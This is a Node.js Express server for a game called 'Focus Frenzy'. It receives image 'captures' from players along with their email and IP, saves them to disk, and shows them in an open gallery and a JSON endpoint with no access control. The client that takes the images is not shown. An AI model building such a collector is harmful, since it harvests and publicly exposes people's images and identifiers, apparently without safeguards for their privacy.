const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Configure multer to save files to /captures folder
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const dir = './captures';
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            console.log('Created captures directory');
        }
        cb(null, dir);
    },
    filename: function (req, file, cb) {
        const { ip, score, email } = req.body;
        // Clean filename: remove special characters
        const cleanIp = (ip || 'unknown').replace(/[^a-zA-Z0-9.]/g, '_');
        const cleanEmail = (email || 'unknown').replace(/[^a-zA-Z0-9@.]/g, '_');
        const filename = `capture_${cleanIp}_score${score}_${Date.now()}.jpg`;
        cb(null, filename);
    }
});

const upload = multer({ 
    storage: storage,
    limits: {
        fileSize: 10 * 1024 * 1024 // 10MB limit
    }
});

// === ROUTES ===

// Capture endpoint - saves image to disk
app.post('/capture', upload.single('image'), (req, res) => {
    try {
        const { email, ip, score, timestamp } = req.body;
        const file = req.file;

        if (!file) {
            return res.status(400).json({ 
                success: false, 
                error: 'No image file received' 
            });
        }

        console.log('NEW CAPTURE SAVED!');
        console.log('=======================================');
        console.log('File:', file.filename);
        console.log('Email:', email);
        console.log('IP:', ip);
        console.log('Score:', score);
        console.log('Time:', new Date(timestamp).toLocaleString());
        console.log('Size:', (file.size / 1024).toFixed(2) + ' KB');
        console.log('Path:', file.path);
        console.log('=======================================');

        res.json({ 
            success: true, 
            message: 'Capture saved successfully',
            filename: file.filename,
            path: file.path
        });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save capture' 
        });
    }
});

// View all captures in a nice web page
app.get('/view-captures', (req, res) => {
    const dir = './captures';
    
    if (!fs.existsSync(dir)) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Focus Frenzy Captures</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                    .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h1 { color: #0f0; text-align: center; }
                    .empty { text-align: center; padding: 40px; color: #666; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Focus Frenzy Captures</h1>
                    <div class="empty">
                        <h2>No captures yet!</h2>
                        <p>Play the game and lose to see captures here.</p>
                        <a href="/">Play Game</a>
                    </div>
                </div>
            </body>
            </html>
        `);
    }

    const files = fs.readdirSync(dir)
        .filter(file => file.endsWith('.jpg'))
        .map(file => {
            const filePath = path.join(dir, file);
            const stats = fs.statSync(filePath);
            // Parse info from filename: capture_IP_score_TIMESTAMP.jpg
            const parts = file.replace('.jpg', '').split('_');
            const ip = parts[1] || 'unknown';
            const score = parts[3]?.replace('score', '') || 'unknown';
            
            return {
                filename: file,
                url: `/captures/${file}`,
                size: stats.size,
                created: stats.birthtime,
                ip: ip,
                score: score
            };
        })
        .sort((a, b) => new Date(b.created) - new Date(a.created)); // Newest first

    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Focus Frenzy Captures</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 0; 
                padding: 20px; 
                background: #000; 
                color: #0f0;
            }
            .container { 
                max-width: 1200px; 
                margin: 0 auto; 
            }
            h1 { 
                text-align: center; 
                color: #0f0; 
                text-shadow: 0 0 10px #0f0;
                margin-bottom: 30px;
            }
            .stats {
                background: #111;
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
                border: 1px solid #0f0;
            }
            .capture-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                gap: 20px;
            }
            .capture-card {
                background: #111;
                border: 2px solid #0f0;
                border-radius: 8px;
                padding: 15px;
                transition: transform 0.2s;
            }
            .capture-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 0 20px #0f0;
            }
            .capture-img {
                width: 100%;
                height: 200px;
                object-fit: cover;
                border-radius: 4px;
                border: 1px solid #0f0;
            }
            .capture-info {
                margin-top: 10px;
                font-size: 0.9em;
            }
            .capture-info p {
                margin: 5px 0;
            }
            .header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }
            .btn {
                background: #0f0;
                color: #000;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 4px;
                font-weight: bold;
            }
            .empty {
                text-align: center;
                padding: 40px;
                color: #666;
            }
            @media (max-width: 768px) {
                .capture-grid {
                    grid-template-columns: 1fr;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Focus Frenzy Captures</h1>
                <a href="/" class="btn">Play Game</a>
            </div>
            
            <div class="stats">
                <strong>Total Captures:</strong> ${files.length} | 
                <strong>Newest:</strong> ${files[0] ? new Date(files[0].created).toLocaleDateString() : 'None'} |
                <a href="/captures-json" style="color: #0f0;">View as JSON</a>
            </div>
    `;

    if (files.length === 0) {
        html += `
            <div class="empty">
                <h2>No captures yet!</h2>
                <p>Play the game and lose to see captures here.</p>
            </div>
        `;
    } else {
        html += `<div class="capture-grid">`;
        
        files.forEach(capture => {
            html += `
            <div class="capture-card">
                <img src="${capture.url}" alt="Capture" class="capture-img" 
                     onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMTExIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0iIzBmMCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPkltYWdlIE5vdCBGb3VuZDwvdGV4dD48L3N2Zz4='">
                <div class="capture-info">
                    <p><strong>File:</strong> ${capture.filename}</p>
                    <p><strong>IP:</strong> ${capture.ip}</p>
                    <p><strong>Score:</strong> ${capture.score}</p>
                    <p><strong>Date:</strong> ${new Date(capture.created).toLocaleString()}</p>
                    <p><strong>Size:</strong> ${(capture.size / 1024).toFixed(2)} KB</p>
                    <a href="${capture.url}" download="${capture.filename}" style="color: #0f0;">Download</a>
                </div>
            </div>
            `;
        });
        
        html += `</div>`;
    }

    html += `
        </div>
        <script>
            // Auto-refresh every 30 seconds to check for new captures
            setTimeout(() => {
                window.location.reload();
            }, 30000);
        </script>
    </body>
    </html>
    `;

    res.send(html);
});

// JSON API endpoint
app.get('/captures-json', (req, res) => {
    const dir = './captures';
    
    if (!fs.existsSync(dir)) {
        return res.json({ captures: [] });
    }

    const files = fs.readdirSync(dir)
        .filter(file => file.endsWith('.jpg'))
        .map(file => {
            const filePath = path.join(dir, file);
            const stats = fs.statSync(filePath);
            const parts = file.replace('.jpg', '').split('_');
            const ip = parts[1] || 'unknown';
            const score = parts[3]?.replace('score', '') || 'unknown';
            
            return {
                filename: file,
                url: `http://${req.headers.host}/captures/${file}`,
                download_url: `http://${req.headers.host}/captures/${file}?download=1`,
                size: stats.size,
                size_kb: (stats.size / 1024).toFixed(2),
                created: stats.birthtime,
                created_formatted: new Date(stats.birthtime).toLocaleString(),
                ip: ip,
                score: score
            };
        })
        .sort((a, b) => new Date(b.created) - new Date(a.created));

    res.json({ 
        success: true,
        total_captures: files.length,
        captures: files 
    });
});

// Serve captured images
app.use('/captures', express.static('captures'));

// Health check
app.get('/health', (req, res) => {
    const dir = './captures';
    const captureCount = fs.existsSync(dir) ? fs.readdirSync(dir).filter(f => f.endsWith('.jpg')).length : 0;
    
    res.json({ 
        status: 'OK', 
        service: 'Focus Frenzy - Local Capture Edition',
        timestamp: new Date().toISOString(),
        captures_count: captureCount,
        endpoints: {
            game: '/',
            view_captures: '/view-captures',
            json_api: '/captures-json',
            health: '/health'
        }
    });
});

// Root route - serve the game
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
FOCUS FRENZY - LOCAL CAPTURE EDITION
=========================================
Server running on port ${PORT}
Captures will be saved to: ./captures/

MANAGEMENT LINKS:
Play Game: http://localhost:${PORT}
View Captures: http://localhost:${PORT}/view-captures  
JSON API: http://localhost:${PORT}/captures-json
Health Check: http://localhost:${PORT}/health

TIP: Check the console for real-time capture notifications!
=========================================
    `);
});